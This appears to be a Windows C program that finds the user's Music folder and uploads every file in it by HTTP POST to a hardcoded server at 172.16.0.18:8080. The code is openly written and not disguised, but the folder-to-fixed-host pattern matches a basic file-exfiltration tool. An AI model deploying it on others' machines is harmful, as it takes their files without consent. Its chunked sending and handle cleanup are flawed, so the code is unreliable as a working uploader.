#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define SERVER_NAME "172.16.0.18"
#define SERVER_PORT 8080
#define UPLOAD_PATH "/upload"
#define BUFFER_SIZE 8192

int get_music_folder(char *buffer, size_t size) {
    PWSTR widePath = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_Music, 0, NULL, &widePath) != S_OK) return 0;
    wcstombs(buffer, widePath, size);
    CoTaskMemFree(widePath);
    return 1;
}

int upload_file_http(const char *filepath, const char *filename) {
    HINTERNET hInternet = InternetOpenA("FileUploader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 0;

    HINTERNET hConnect = InternetConnectA(hInternet, SERVER_NAME, SERVER_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 0;
    }

    const char *headers = "Content-Type: application/octet-stream\r\n";
    char uploadUrl[256];
    snprintf(uploadUrl, sizeof(uploadUrl), "%s?name=%s", UPLOAD_PATH, filename);

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", uploadUrl, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 0;
    }

    FILE *file = fopen(filepath, "rb");
    if (!file) return 0;

    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;
    BOOL sendSuccess = TRUE;

    while ((bytesRead = (DWORD)fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
        if (!HttpSendRequestA(hRequest, headers, -1, buffer, bytesRead)) {
            sendSuccess = FALSE;
            break;
        }
    }

    fclose(file);
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return sendSuccess ? 1 : 0;
}

void send_all_music() {
    char music_dir[MAX_PATH];
    if (!get_music_folder(music_dir, sizeof(music_dir))) {
        printf("Could not find Music folder.\n");
        return;
    }

    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*.*", music_dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char fullpath[MAX_PATH];
            snprintf(fullpath, MAX_PATH, "%s\\%s", music_dir, fd.cFileName);
            printf("Uploading: %s\n", fd.cFileName);
            upload_file_http(fullpath, fd.cFileName);
        }
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

int main() {
    send_all_music();
    return 0;
}
